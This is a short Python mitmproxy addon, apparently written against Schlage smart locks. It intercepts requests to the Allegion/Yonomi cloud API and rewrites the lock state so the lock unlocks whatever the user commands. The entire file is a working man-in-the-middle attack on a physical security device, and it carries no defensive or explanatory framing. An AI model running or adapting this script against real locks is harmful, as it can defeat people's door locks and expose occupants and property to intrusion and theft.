"""
This script forces the Schlage lock to unlock regardless of user input
"""
from mitmproxy import http, ctx
import json

def request(flow: http.HTTPFlow) -> None:
    if "api.allegion.yonomi.cloud" in flow.request.pretty_host:
        data = json.loads(flow.request.content)
        data['attributes']['lockState'] = 0
        flow.request.content = bytes(json.dumps(data), 'utf-8')
        ctx.log.alert("[Schlage] <forcing unlock action> ")
